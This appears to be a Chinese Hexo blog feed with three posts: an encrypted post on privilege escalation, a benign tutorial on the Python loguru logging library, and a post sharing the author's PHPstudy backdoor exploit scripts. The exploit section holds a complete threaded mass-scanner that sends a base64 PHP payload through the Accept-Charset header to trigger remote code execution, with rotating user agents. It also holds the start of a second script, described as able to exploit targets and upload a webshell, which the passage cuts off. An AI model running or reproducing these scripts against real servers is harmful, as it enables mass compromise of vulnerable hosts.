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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 中更优雅的日志记录方案——loguru</title>
    <url>/2019/10/14/Python-%E4%B8%AD%E6%9B%B4%E4%BC%98%E9%9B%85%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E6%96%B9%E6%A1%88%E2%80%94%E2%80%94loguru/</url>
    <content><![CDATA[<h3 id="python日志记录方案"><a href="#python日志记录方案" class="headerlink" title="python日志记录方案"></a>python日志记录方案</h3><blockquote>
<p>在 Python 中，一般情况下我们可能直接用自带的 logging 模块来记录日志，包括我之前的时候也是一样。在使用时我们需要配置一些 Handler、Formatter 来进行一些处理，比如把日志输出到不同的位置，或者设置一个不同的输出格式，或者设置日志分块和备份。但其实个人感觉 logging 用起来其实并不是那么好用，其实主要还是配置较为繁琐。</p>
</blockquote>
<h3 id="更优雅的方式"><a href="#更优雅的方式" class="headerlink" title="更优雅的方式"></a>更优雅的方式</h3><p><strong>loguru</strong></p>
<blockquote>
<p>loguru不需要配置什么东西，直接引入一个 logger，然后调用其 debug 方法即可。在 loguru 里面有且仅有一个主要对象，那就是 logger，loguru 里面有且仅有一个 logger，而且它已经被提前配置了一些基础信息，比如比较友好的格式化、文本颜色信息等等。</p>
</blockquote>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><code>pip3 install loguru</code></p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><h5 id="输出日志"><a href="#输出日志" class="headerlink" title="输出日志"></a>输出日志</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br></pre></td></tr></table></figure>
<h5 id="输出到文件"><a href="#输出到文件" class="headerlink" title="输出到文件"></a>输出到文件</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_&#123;time&#125;.log"</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br><span class="line">logger.info(<span class="string">"这是一条info日志"</span>)</span><br></pre></td></tr></table></figure>
<h5 id="日志规则"><a href="#日志规则" class="headerlink" title="日志规则"></a>日志规则</h5><p>设置日志格式，过滤器，日志级别</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file.log"</span>, format=<span class="string">"&#123;time&#125; &#123;level&#125; &#123;message&#125;"</span>, filter=<span class="string">""</span>, level=<span class="string">"INFO"</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br><span class="line">logger.info(<span class="string">"这是一条info日志"</span>)</span><br></pre></td></tr></table></figure>
<h5 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h5><p>文件管理方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logger.add(<span class="string">"file_1.log"</span>, rotation=<span class="string">"500 MB"</span>)    <span class="comment"># 文件过大就会重新生成一个文件</span></span><br><span class="line">logger.add(<span class="string">"file_2.log"</span>, rotation=<span class="string">"12:00"</span>)     <span class="comment"># 每天12点创建新文件</span></span><br><span class="line">logger.add(<span class="string">"file_3.log"</span>, rotation=<span class="string">"1 week"</span>)    <span class="comment"># 文件时间过长就会创建新文件</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_X.log"</span>, retention=<span class="string">"10 days"</span>)  <span class="comment"># 一段时间后会清空</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_Y.log"</span>, compression=<span class="string">"zip"</span>)    <span class="comment"># 保存zip格式</span></span><br></pre></td></tr></table></figure>
<h5 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logger.add(<span class="string">"somefile.log"</span>, enqueue=<span class="keyword">True</span>)  <span class="comment"># 异步写入</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"somefile.log"</span>, serialize=<span class="keyword">True</span>)  <span class="comment"># 序列化为json</span></span><br></pre></td></tr></table></figure>
<h5 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logger.add(<span class="string">"file.log"</span>, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125; | &#123;level&#125; | &#123;message&#125;"</span>)</span><br></pre></td></tr></table></figure>
<p>配合notifiers模块<br>github： <a href="https://github.com/notifiers/notifiers" target="_blank" rel="noopener">https://github.com/notifiers/notifiers</a><br>文档：<a href="https://notifiers.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://notifiers.readthedocs.io/en/latest/</a></p>
<h5 id="在工程中创建多个文件处理器对象并解决中文乱码问题"><a href="#在工程中创建多个文件处理器对象并解决中文乱码问题" class="headerlink" title="在工程中创建多个文件处理器对象并解决中文乱码问题"></a>在工程中创建多个文件处理器对象并解决中文乱码问题</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line"></span><br><span class="line">log_file_path = os.path.join(BASE_DIR,<span class="string">'Log/my_first.log'</span>)</span><br><span class="line">err_log_file_path = os.path.join(BASE_DIR,<span class="string">'Log/error.log'</span>)</span><br><span class="line"></span><br><span class="line">logger.add(sys.stderr, format=<span class="string">"&#123;time&#125; &#123;level&#125; &#123;message&#125;"</span>, filter=<span class="string">"my_noudle"</span>, level=<span class="string">"INFO"</span>)</span><br><span class="line"></span><br><span class="line">logger.add(log_file_path, rotation=<span class="string">"500 MB"</span>, encoding=<span class="string">'utf-8'</span>)  <span class="comment"># Automatically rotate too big file</span></span><br><span class="line">logger.add(err_log_file_path, rotation=<span class="string">"500 MB"</span>, encoding=<span class="string">'utf-8'</span>,</span><br><span class="line">           level=<span class="string">'ERROR'</span>)  <span class="comment"># Automatically rotate too big file</span></span><br><span class="line">logger.debug(<span class="string">"That's it, beautiful and simple logging!"</span>)</span><br><span class="line">logger.debug(<span class="string">"中文日志可以不"</span>)</span><br><span class="line">logger.error(<span class="string">"严重错误"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571020366.4.png" alt></p>
<h5 id="Traceback-记录"><a href="#Traceback-记录" class="headerlink" title="Traceback 记录"></a>Traceback 记录</h5><blockquote>
<p>在很多情况下，如果遇到运行错误，而我们在打印输出 log 的时候万一不小心没有配置好 Traceback 的输出，很有可能我们就没法追踪错误所在了。但用了 loguru 之后，我们用它提供的装饰器就可以直接进行 Traceback 的记录。<strong>用 loguru 可以非常方便地实现日志追踪</strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line"><span class="meta">@logger.catch</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_function</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line">    <span class="comment"># An error? It's caught anyway!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (x + y + z)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_function(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571020539.21.png" alt></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzA4NDk3Nw==&amp;mid=2457738232&amp;idx=1&amp;sn=bfc6437b494249270d2b6dc3469eda61&amp;chksm=ff44b3a6c8333ab010268aed413da647f711839dbf8ba8b73d06b9502a4ba95482b11606f81b&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1571014978932&amp;sharer_shareid=b4f68ebe4eb5286506b3d3b1a76fd4c7#rd" target="_blank" rel="noopener">Python 中更优雅的日志记录方案</a></p>
<p><a href="https://loguru.readthedocs.io/en/stable/index.html" target="_blank" rel="noopener">loguru官方文档</a></p>
<p><a href="http://www.manongjc.com/detail/8-xkpixvxrrbkbqxw.html" target="_blank" rel="noopener">Python 第三方日志框架loguru使用</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>loguru</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPstudy后门漏洞POC-EXP编写</title>
    <url>/2019/10/14/PHPstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9EPOC-EXP%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h3 id="PHPstudy后门漏洞POC-EXP编写"><a href="#PHPstudy后门漏洞POC-EXP编写" class="headerlink" title="PHPstudy后门漏洞POC-EXP编写"></a>PHPstudy后门漏洞POC-EXP编写</h3><blockquote>
<p>phpstudy后门事件过去有一段时间了，漏洞也已经复现了；网上有好多检测的POC，为什么要自己写呢，因为好久没有写代码了，通过这个漏洞巩固一下code，代码国庆前写了一半，被各种事情耽搁，今天补写完整。这次写代码使用面向对象以及参数化编写，就漏洞本身来说，这种方式很麻烦，但是为了毕设的代码量练习（小声BB）。脚本支持PHPstudy2018和2016后门漏洞的检测、利用以及直接上传shell。</p>
</blockquote>
<h3 id="代码-and-效果"><a href="#代码-and-效果" class="headerlink" title="代码 and 效果"></a>代码 and 效果</h3><h4 id="批量检测POC"><a href="#批量检测POC" class="headerlink" title="批量检测POC"></a>批量检测POC</h4><p>支持自定义输入目标文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    payload = <span class="string">"phpinfo();"</span></span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">    headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">    headers[<span class="string">'Accept-Charset'</span>] = payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = requests.get(url,headers=headers,timeout=TIME_OUT)</span><br><span class="line">        result.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(result.content):</span><br><span class="line">            print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'success.txt'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(url + <span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()</span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982761.17.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982822.79.png" alt></p>
<h4 id="带参数检测、利用、传shell"><a href="#带参数检测、利用、传shell" class="headerlink" title="带参数检测、利用、传shell"></a>带参数检测、利用、传shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; 